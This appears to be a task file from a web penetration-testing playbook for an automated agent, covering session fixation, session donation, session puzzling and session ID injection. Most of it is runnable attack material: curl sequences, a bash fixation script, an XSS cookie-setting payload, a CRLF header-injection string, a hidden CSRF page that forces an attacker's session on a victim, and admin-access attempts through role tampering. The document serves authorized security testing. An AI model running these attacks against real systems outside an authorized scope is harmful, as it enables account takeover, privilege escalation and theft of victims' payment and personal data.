================================================================================
TASK 63 Â· SESSION FIXATION & MANIPULATION
================================================================================
Covers testing_toolkit.txt Phase 7 Step 25 (Part 1)
Attacks on session CREATION and ASSIGNMENT mechanisms.

OBJECTIVE:
- Exploit session fixation to hijack victim accounts
- Abuse session donation to force victim into attacker's context
- Exploit session puzzling to escalate privileges
- Test session ID injection via URL, cookies, and headers

================================================================================
INPUTS
================================================================================
outputs/har/accounts/*_auth.json          â† Session cookies from HAR (per-account)
outputs/har/common_data.txt               â† Auth-related endpoints from HAR
outputs/live_base_urls.txt                â† Target hosts
outputs/url_corpus_all_in_scope.txt       â† URL corpus (grep for login/auth paths)

================================================================================
OUTPUTS
================================================================================
outputs/session_attacks/
â”œâ”€â”€ session_mechanisms.txt         â† Identified session handling methods
â”œâ”€â”€ fixation_vulnerable.txt        â† Session fixation vulnerabilities
â”œâ”€â”€ donation_vulnerable.txt        â† Session donation attack results
â”œâ”€â”€ puzzling_results.txt           â† Session puzzling findings
â”œâ”€â”€ injection_vectors.txt          â† Session ID injection points
â””â”€â”€ scan_log.txt                   â† Full execution log

================================================================================
ğŸ§  SESSION FUNDAMENTALS - UNDERSTAND BEFORE ATTACKING ğŸ§ 
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
How Sessions Work
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1. User visits site â†’ Server creates session ID
2. Session ID stored: Cookie, URL parameter, or hidden field
3. User authenticates â†’ Session linked to user identity
4. Subsequent requests include session ID â†’ Server identifies user

SECURE FLOW:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. User visits â†’ Server creates session ID: abc123                          â”‚
â”‚ 2. User logs in â†’ Server DESTROYS abc123, creates NEW session: xyz789       â”‚
â”‚ 3. xyz789 is now linked to authenticated user                               â”‚
â”‚ âœ“ Session regeneration prevents fixation                                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

VULNERABLE FLOW:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. Attacker visits â†’ Gets session ID: abc123                                â”‚
â”‚ 2. Attacker sends link to victim with session abc123                        â”‚
â”‚ 3. Victim clicks â†’ Uses session abc123                                      â”‚
â”‚ 4. Victim logs in â†’ Session abc123 now authenticated                        â”‚
â”‚ 5. Attacker uses abc123 â†’ Has victim's access!                              â”‚
â”‚ âœ— No session regeneration = Session Fixation                                â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Session ID Locations
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
COOKIES (Most Common):
Set-Cookie: PHPSESSID=abc123; HttpOnly; Secure
Set-Cookie: JSESSIONID=abc123; Path=/
Set-Cookie: ASP.NET_SessionId=abc123

URL PARAMETERS (Legacy/Vulnerable):
https://target.com/page?PHPSESSID=abc123
https://target.com/page;jsessionid=abc123

HIDDEN FORM FIELDS:
<input type="hidden" name="session" value="abc123">

CUSTOM HEADERS:
X-Session-Token: abc123
Authorization: Session abc123

================================================================================
PHASE 1: SESSION MECHANISM DISCOVERY
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.1 Identify Session Cookies
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Common session cookie names
PHPSESSID          # PHP
JSESSIONID         # Java/JSP
ASP.NET_SessionId  # ASP.NET
CFID/CFTOKEN       # ColdFusion
session            # Generic
sess               # Generic
sid                # Session ID
token              # Token-based
auth_token         # Auth token
_session           # Ruby/Rails
connect.sid        # Express.js
laravel_session    # Laravel

# Extract from HAR
grep -oP 'Set-Cookie:\s*[^;]+' har_file.har | sort -u

# Extract cookie names
curl -s -c - -b - "https://target.com/login" 2>/dev/null | grep -v "^#"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.2 Check Session ID in URL
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Look for session in URL parameters
curl -s -I "https://target.com/login" | grep -i "location"

# Check if app accepts session in URL
curl -s "https://target.com/page?PHPSESSID=test123" -c cookies.txt
cat cookies.txt

# Java-style URL rewriting
curl -s "https://target.com/page;jsessionid=test123"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.3 Analyze Session ID Properties
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Check session ID entropy/randomness
# Good: 128+ bits of randomness
# Bad: Sequential, predictable, short

# Test multiple sessions, look for patterns
for i in {1..5}; do
    curl -s -c - "https://target.com/" 2>/dev/null | grep -oP 'PHPSESSID=[^;]+'
    sleep 1
done

# Check session ID length
# < 16 chars = potentially weak
# >= 32 chars = generally secure

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.4 Check Cookie Security Attributes
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
curl -s -I "https://target.com/login" | grep -i "set-cookie"

# LOOK FOR:
# HttpOnly    â†’ Present = Good (prevents XSS theft)
# Secure      â†’ Present = Good (HTTPS only)
# SameSite    â†’ Strict/Lax = Good (CSRF protection)
# Path        â†’ / or specific path
# Domain      â†’ Should be specific, not overly broad

# MISSING ANY = POTENTIAL VULNERABILITY

================================================================================
PHASE 2: SESSION FIXATION ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.1 Understanding Session Fixation
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ATTACK FLOW:
1. Attacker obtains valid session ID (visits site)
2. Attacker tricks victim into using that session ID
3. Victim authenticates with attacker's session ID
4. Attacker uses same session ID â†’ authenticated as victim

PREREQUISITES:
- App accepts session ID from URL/attacker-controlled source
- App does NOT regenerate session ID after authentication
- Session ID remains valid after authentication

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.2 Test Session Regeneration
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# CRITICAL TEST: Does session ID change after login?

# Step 1: Get pre-auth session
curl -s -c cookies_before.txt "https://target.com/login"
cat cookies_before.txt | grep -oP 'PHPSESSID\s+\K\S+'

# Step 2: Login (capture new cookies)
curl -s -c cookies_after.txt -b cookies_before.txt \
    -X POST "https://target.com/login" \
    -d "username=testuser&password=testpass"

# Step 3: Compare session IDs
echo "Before login:"
cat cookies_before.txt | grep -i session
echo "After login:"
cat cookies_after.txt | grep -i session

# IF SAME SESSION ID â†’ VULNERABLE TO FIXATION!

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.3 Session Fixation via URL
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Test if session can be set via URL parameter

# Step 1: Create fixation URL
FIXED_SESSION="attacker_controlled_session_123"
FIXATION_URL="https://target.com/login?PHPSESSID=${FIXED_SESSION}"

# Step 2: Simulate victim visiting fixation URL and logging in
curl -s -c victim_cookies.txt "${FIXATION_URL}"
curl -s -c victim_cookies.txt -b victim_cookies.txt \
    -X POST "https://target.com/login" \
    -d "username=victim&password=victimpass"

# Step 3: Attacker uses fixed session
curl -s -b "PHPSESSID=${FIXED_SESSION}" "https://target.com/profile"

# If attacker sees victim's profile â†’ VULNERABLE!

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.4 Session Fixation via Cookie Injection
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# If subdomain or XSS exists, attacker can set cookies

# Via XSS:
<script>document.cookie="PHPSESSID=attacker123;path=/"</script>

# Via subdomain (if .target.com cookie allowed):
# Attacker controls evil.target.com
# Sets cookie for .target.com domain
# Victim visits main target.com with attacker's session

# Test domain scope
curl -s -I "https://target.com/" | grep -i "set-cookie" | grep -i "domain"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.5 Session Fixation via Meta Tag
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Some apps accept session from meta refresh
<meta http-equiv="Set-Cookie" content="PHPSESSID=attacker123">

# Or via HTTP header injection
%0d%0aSet-Cookie:%20PHPSESSID=attacker123

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.6 Automated Fixation Test Script
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# session_fixation_test.sh

TARGET="$1"
LOGIN_URL="$2"
PROFILE_URL="$3"
USERNAME="$4"
PASSWORD="$5"

FIXED_SID="fixation_test_$(date +%s)"

echo "[*] Testing Session Fixation on $TARGET"
echo "[*] Fixed Session ID: $FIXED_SID"

# Try different fixation methods
echo "[*] Method 1: URL Parameter"
curl -s -c /tmp/fix1.txt "${LOGIN_URL}?PHPSESSID=${FIXED_SID}" > /dev/null
curl -s -b /tmp/fix1.txt -c /tmp/fix1.txt \
    -X POST "$LOGIN_URL" \
    -d "username=${USERNAME}&password=${PASSWORD}" > /dev/null

# Check if fixed session works
response=$(curl -s -b "PHPSESSID=${FIXED_SID}" "$PROFILE_URL")
if echo "$response" | grep -qi "welcome\|profile\|dashboard\|$USERNAME"; then
    echo "[!] VULNERABLE: Session Fixation via URL!"
fi

echo "[*] Method 2: Cookie Header"
curl -s -H "Cookie: PHPSESSID=${FIXED_SID}" -c /tmp/fix2.txt "$LOGIN_URL" > /dev/null
curl -s -b /tmp/fix2.txt -c /tmp/fix2.txt \
    -X POST "$LOGIN_URL" \
    -d "username=${USERNAME}&password=${PASSWORD}" > /dev/null

response=$(curl -s -b "PHPSESSID=${FIXED_SID}" "$PROFILE_URL")
if echo "$response" | grep -qi "welcome\|profile\|dashboard\|$USERNAME"; then
    echo "[!] VULNERABLE: Session Fixation via Cookie Header!"
fi

================================================================================
PHASE 3: SESSION DONATION ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.1 Understanding Session Donation
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ATTACK FLOW (Reverse of Fixation):
1. Attacker logs into their own account
2. Attacker captures their authenticated session ID
3. Attacker tricks victim into using attacker's session
4. Victim thinks they're logged in as themselves
5. Victim performs sensitive actions (adds credit card, etc.)
6. Attacker accesses their account â†’ has victim's data!

USE CASES:
- Victim adds payment method â†’ Attacker has it
- Victim enters PII â†’ Attacker collects it
- Victim makes purchase â†’ Attacker receives goods

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.2 Session Donation Test
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Step 1: Attacker logs in, gets session
curl -s -c attacker_session.txt \
    -X POST "https://target.com/login" \
    -d "username=attacker&password=attackerpass"

ATTACKER_SESSION=$(grep -oP 'PHPSESSID\s+\K\S+' attacker_session.txt)
echo "[*] Attacker session: $ATTACKER_SESSION"

# Step 2: Create donation link
# https://target.com/account?PHPSESSID=$ATTACKER_SESSION

# Step 3: If victim visits and adds payment info...
# Attacker checks their account for victim's data

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.3 Session Donation via CSRF
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# If app accepts session in URL and has no CSRF protection:

<html>
<body>
<!-- Force victim to use attacker's session -->
<img src="https://target.com/set_session?sid=ATTACKER_SESSION" style="display:none">
<script>
// Redirect to account page with attacker's session
setTimeout(function() {
    window.location = "https://target.com/account?PHPSESSID=ATTACKER_SESSION";
}, 1000);
</script>
</body>
</html>

================================================================================
PHASE 4: SESSION PUZZLING ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.1 Understanding Session Puzzling
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
CONCEPT: Different application flows store variables in the same session
- Login flow sets: session['authenticated'] = true
- Password reset sets: session['reset_user'] = "admin"
- If reset flow doesn't clear 'authenticated' â†’ privilege escalation!

ATTACK: Exploit session variable collisions between different flows

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.2 Identify Session-Dependent Flows
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Flows that likely use session variables:
- Login/Authentication
- Password Reset
- Email Verification
- Multi-step Wizards
- Shopping Cart
- Account Settings
- Admin Functions

# For each flow, track session state changes

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.3 Session Puzzling Test Cases
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# TEST 1: Password Reset â†’ Login Bypass
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Hypothesis: Password reset stores user identity in session

# Step 1: Start password reset for admin
curl -s -c session.txt -X POST "https://target.com/forgot-password" \
    -d "email=admin@target.com"

# Step 2: Don't complete reset, try accessing protected page
curl -s -b session.txt "https://target.com/admin"

# If admin access granted â†’ Session Puzzling!

# TEST 2: Registration â†’ Admin Access
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Step 1: Start registration with role manipulation
curl -s -c session.txt -X POST "https://target.com/register" \
    -d "username=test&email=test@test.com&role=admin"

# Step 2: Abandon registration, try admin endpoint
curl -s -b session.txt "https://target.com/admin/dashboard"

# TEST 3: Multi-step Flow Skip
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Step 1: Complete step 1 of wizard
curl -s -c session.txt -X POST "https://target.com/wizard/step1" \
    -d "data=value"

# Step 2: Skip to final step
curl -s -b session.txt "https://target.com/wizard/complete"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.4 Session Variable Enumeration
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Look for debug endpoints that expose session
curl -s "https://target.com/debug/session"
curl -s "https://target.com/phpinfo.php" | grep -i session
curl -s "https://target.com/actuator/sessions"

# Error messages may leak session structure
curl -s "https://target.com/page?session[admin]=true"

================================================================================
PHASE 5: SESSION ID INJECTION
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.1 URL-Based Injection
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Standard URL parameter
https://target.com/page?PHPSESSID=injected
https://target.com/page?session=injected
https://target.com/page?sid=injected

# Java URL rewriting
https://target.com/page;jsessionid=injected

# Path-based
https://target.com/PHPSESSID=injected/page
https://target.com/(S(injected))/page  # ASP.NET cookieless

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.2 Header-Based Injection
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Cookie header
curl -H "Cookie: PHPSESSID=injected" "https://target.com/page"

# Custom session headers (check app behavior)
curl -H "X-Session-Id: injected" "https://target.com/page"
curl -H "X-Auth-Token: injected" "https://target.com/page"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.3 POST Body Injection
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Hidden form field
curl -X POST "https://target.com/action" \
    -d "action=submit&PHPSESSID=injected"

# JSON body
curl -X POST "https://target.com/api/action" \
    -H "Content-Type: application/json" \
    -d '{"action":"submit","session":"injected"}'

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.4 Injection Priority Testing
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Test which source takes precedence
# Send different session IDs via different methods

curl -H "Cookie: PHPSESSID=cookie_session" \
     "https://target.com/page?PHPSESSID=url_session"

# Check which session is used
# If URL overrides Cookie â†’ easier fixation attack

================================================================================
ğŸ§  YOU ARE AN INTELLIGENT AGENT ğŸ§ 
================================================================================

RECONNAISSANCE FIRST:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1. Identify ALL session mechanisms (cookies, URL, headers)
2. Note session cookie names and attributes
3. Map authentication flow
4. Identify multi-step processes that use sessions
5. Check for debug endpoints exposing session data

ATTACK PRIORITY:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Priority â”‚ Attack                  â”‚ Impact                                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 1        â”‚ Session Fixation        â”‚ Account takeover                      â”‚
â”‚ 2        â”‚ No Regeneration         â”‚ Enables fixation                      â”‚
â”‚ 3        â”‚ Session Puzzling        â”‚ Privilege escalation                  â”‚
â”‚ 4        â”‚ Session Donation        â”‚ Data theft via social engineering    â”‚
â”‚ 5        â”‚ URL Session ID          â”‚ Session exposure, fixation vector    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

VERIFICATION CHECKLIST:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â–¡ Does session ID change after login? (If no â†’ Fixation possible)
â–¡ Can session ID be set via URL? (If yes â†’ Easy fixation)
â–¡ Does password reset affect session state? (Puzzling check)
â–¡ Are session cookies HttpOnly? (If no â†’ XSS can steal)
â–¡ Are session cookies Secure? (If no â†’ MITM can steal)

================================================================================
COMMON MISTAKES TO AVOID
================================================================================
âŒ Not testing session regeneration after EVERY auth state change
âŒ Only testing fixation via URL, missing cookie injection
âŒ Forgetting to test session puzzling across different flows
âŒ Not checking all cookie security attributes
âŒ Missing URL rewriting patterns (;jsessionid=)

================================================================================
SUCCESS CRITERIA
================================================================================
âœ“ Session mechanism fully documented
âœ“ Session regeneration tested at all auth transitions
âœ“ Fixation attacks attempted via URL, cookie, header
âœ“ Session puzzling tested across all multi-step flows
âœ“ Session donation scenario documented if applicable
âœ“ All injection vectors tested

